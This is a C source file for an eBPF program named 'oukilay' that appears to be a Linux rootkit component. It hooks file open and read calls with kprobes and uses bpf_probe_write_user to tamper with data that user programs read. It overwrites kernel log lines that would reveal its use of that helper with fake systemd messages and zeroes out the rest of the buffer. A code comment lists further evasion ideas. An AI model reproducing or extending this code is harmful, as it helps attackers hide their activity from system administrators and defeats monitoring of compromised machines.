#include <linux/kconfig.h>
#include <linux/ptrace.h>
#include <linux/types.h>
#include <linux/version.h>

#include "include/bpf.h"
#include "include/bpf_helpers.h"

/*
    - we should use the dentry resolver to avoid bypass
    - handle do_syslog
    - possibly redirect syscall number open to unlink
    - possible to use named pipe to block open
*/

#define MAX_SEGMENT_LENGTH 32

enum
{
    KMSG_ACTION = 1,
    KPROBE_EVENTS_ACTION
};

struct bpf_map_def SEC("maps/read_ret_progs") read_ret_progs = {
    .type = BPF_MAP_TYPE_PROG_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(u32),
    .max_entries = 10,
};

struct oukilay_file_t
{
    int fd;
    int action;

    void *read_buf;
    int read_size;
};

struct bpf_map_def SEC("maps/oukilay_files") oukilay_files = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u64),
    .value_size = sizeof(struct oukilay_file_t),
    .max_entries = 128,
    .pinning = 0,
    .namespace = "",
};

struct oukilay_path_key_t
{
    u64 hash;
    u64 pos;
};

struct oukilay_path_action_t
{
    u64 fs_hash;
    u64 action;
};

struct bpf_map_def SEC("maps/oukilay_path_keys") oukilay_path_keys = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(struct oukilay_path_key_t),
    .value_size = sizeof(struct oukilay_path_action_t),
    .max_entries = 128,
    .pinning = 0,
    .namespace = "",
};

// Fowler/Noll/Vo hash
#define FNV_BASIS ((__u64)14695981039346656037U)
#define FNV_PRIME ((__u64)1099511628211U)

#define __update_hash(key, data) \
    *key ^= (__u64)(data);       \
    *key *= FNV_PRIME;

void __attribute__((always_inline)) update_hash_byte(__u64 *key, __u8 byte)
{
    __update_hash(key, byte);
}

void __attribute__((always_inline)) update_hash_str(__u64 *hash, const char *str)
{
#pragma unroll
    for (int i = 0; i != MAX_SEGMENT_LENGTH; i++)
    {
        if (str[i] == '\0')
        {
            break;
        }
        update_hash_byte(hash, str[i]);
    }
}

static __attribute__((always_inline)) u64 get_fs_hash(struct dentry *dentry)
{
    struct inode *d_inode;
    bpf_probe_read(&d_inode, sizeof(d_inode), &dentry->d_inode);

    struct super_block *sb;
    bpf_probe_read(&sb, sizeof(sb), &d_inode->i_sb);

    struct file_system_type *type;
    bpf_probe_read(&type, sizeof(type), &sb->s_type);

    char *name_ptr;
    bpf_probe_read(&name_ptr, sizeof(name_ptr), &type->name);

    char name[32];
    bpf_probe_read_str(&name, sizeof(name), name_ptr);

    u64 hash = FNV_BASIS;
    update_hash_str(&hash, name);

    return hash;
}

static __attribute__((always_inline)) u64 get_file_action(struct dentry *dentry)
{
    struct qstr qstr;
    struct dentry *d_parent;
    struct inode *d_inode = NULL;
    char name[MAX_SEGMENT_LENGTH + 1];
    int end = 0;

    struct oukilay_path_key_t key = {};

#pragma unroll
    for (int i = 0; i < 15; i++)
    {
        d_parent = NULL;
        bpf_probe_read(&d_parent, sizeof(d_parent), &dentry->d_parent);

        if (dentry != d_parent)
        {
            bpf_probe_read(&d_inode, sizeof(d_inode), &d_parent->d_inode);
        }

        bpf_probe_read(&qstr, sizeof(qstr), &dentry->d_name);
        bpf_probe_read_str(&name, sizeof(name), (void *)qstr.name);

        if (name[0] == '/' || name[0] == 0)
        {
            name[0] = '/';
            end = 1;
        }

        key.hash = FNV_BASIS;
        key.pos = i;

        update_hash_str(&key.hash, name);

        struct oukilay_path_action_t *action = bpf_map_lookup_elem(&oukilay_path_keys, &key);
        if (!action)
        {
            return 0;
        }
        else if (action->action)
        {
            if (!action->fs_hash || action->fs_hash == get_fs_hash(dentry))
            {
                return action->action;
            }
        }

        if (end)
            return 0;

        dentry = d_parent;
    }

    return 0;
}

SEC("kprobe/vfs_open")
int _vfs_open(struct pt_regs *ctx)
{
    struct path *path = (struct path *)PT_REGS_PARM1(ctx);

    struct dentry *dentry;
    bpf_probe_read(&dentry, sizeof(dentry), &path->dentry);

    u64 action = get_file_action(dentry);
    if (!action)
    {
        return 0;
    }

    u64 key = bpf_get_current_pid_tgid();
    struct oukilay_file_t value = {
        .action = action};
    bpf_map_update_elem(&oukilay_files, &key, &value, BPF_ANY);

    return 0;
}

SEC("kretprobe/__x64_sys_openat")
int __x64_sys_openat_ret(struct pt_regs *ctx)
{
    u64 key = bpf_get_current_pid_tgid();
    struct oukilay_file_t *value = (struct oukilay_file_t *)bpf_map_lookup_elem(&oukilay_files, &key);
    if (!value)
    {
        return 0;
    }

    value->fd = (int)PT_REGS_RC(ctx);

    return 0;
}

SEC("kprobe/__x64_sys_read")
int kprobe_sys_read(struct pt_regs *ctx)
{
    u64 key = bpf_get_current_pid_tgid();
    struct oukilay_file_t *value = (struct oukilay_file_t *)bpf_map_lookup_elem(&oukilay_files, &key);
    if (!value)
    {
        return 0;
    }

    ctx = (struct pt_regs *)PT_REGS_PARM1(ctx);

    int fd;
    bpf_probe_read(&fd, sizeof(fd), &PT_REGS_PARM1(ctx));

    if (value->fd == fd)
    {
        void *buf = NULL;
        bpf_probe_read(&buf, sizeof(buf), &PT_REGS_PARM2(ctx));

        value->read_buf = buf;
    }

    return 0;
}

SEC("kprobe/fill_with_zero")
int fill_with_zero(struct pt_regs *ctx)
{
    u64 key = bpf_get_current_pid_tgid();
    struct oukilay_file_t *value = (struct oukilay_file_t *)bpf_map_lookup_elem(&oukilay_files, &key);
    if (!value)
    {
        return 0;
    }

    const char c = '\0';

#pragma unroll
    for (int i = 0; i != 256; i++)
    {
        if (i == value->read_size - 1)
        {
            break;
        }
        bpf_probe_write_user(value->read_buf + i, &c, 1);
    }

    return 0;
}

SEC("kprobe/kmsg")
int kmsg(struct pt_regs *ctx)
{
    int retval = PT_REGS_RC(ctx);

    u64 key = bpf_get_current_pid_tgid();
    struct oukilay_file_t *value = (struct oukilay_file_t *)bpf_map_lookup_elem(&oukilay_files, &key);
    if (!value)
    {
        return 0;
    }

    if (!value->read_buf)
    {
        return 0;
    }

    char buf[128];
    bpf_probe_read(buf, sizeof(buf), value->read_buf);

    u8 o1 = 0;
    u64 hash = 0;

#pragma unroll
    for (int i = 0; i != 128; i++)
    {
        if (buf[i] == ';' && !o1)
        {
            hash = FNV_BASIS;
            o1 = i + 1;
            continue;
        }
        else if (buf[i] == ' ')
        {
            hash = FNV_BASIS;
            continue;
        }
        update_hash_byte(&hash, buf[i]);

        // `bpf_probe_write_user` hash or `bpf_get_probe_write_proto`
        if (hash == 0xada8e5f3e94cf1f8 || hash == 0x55c7edee212d1ef4)
        {
            break;
        }
    }

    if (hash == 0xada8e5f3e94cf1f8)
    {
        const char override[] = "systemd[1]: Reached target Sockets.";
        bpf_probe_write_user(value->read_buf + o1, override, sizeof(override) - 1);

        value->read_buf += o1 + sizeof(override) - 1;
        value->read_size = retval - (o1 + sizeof(override) - 1);

        bpf_tail_call(ctx, &read_ret_progs, 3);
    }

    if (hash == 0x55c7edee212d1ef4)
    {
        const char override[] = "systemd[1]: Reached target Paths.";
        bpf_probe_write_user(value->read_buf + o1, override, sizeof(override) - 1);

        value->read_buf += o1 + sizeof(override) - 1;
        value->read_size = retval - (o1 + sizeof(override) - 1);

        bpf_tail_call(ctx, &read_ret_progs, 3);
    }

    return 0;
}

SEC("kprobe/kprobe_events")
int kprobe_events(struct pt_regs *ctx)
{
    int retval = PT_REGS_RC(ctx);
    if (!retval)
    {
        return 0;
    }

    u64 key = bpf_get_current_pid_tgid();
    struct oukilay_file_t *value = (struct oukilay_file_t *)bpf_map_lookup_elem(&oukilay_files, &key);
    if (!value)
    {
        return 0;
    }

    if (!value->read_buf)
    {
        return 0;
    }

    char buf[128];
    bpf_probe_read(buf, sizeof(buf), value->read_buf);

    return 0;
}

SEC("kretprobe/__x64_sys_read")
int __x64_sys_read_ret(struct pt_regs *ctx)
{
    u64 key = bpf_get_current_pid_tgid();
    struct oukilay_file_t *value = (struct oukilay_file_t *)bpf_map_lookup_elem(&oukilay_files, &key);
    if (!value)
    {
        return 0;
    }

    bpf_tail_call(ctx, &read_ret_progs, value->action);

    return 0;
}

char _license[] SEC("license") = "GPL";
__u32 _version SEC("version") = 0xFFFFFFFE;
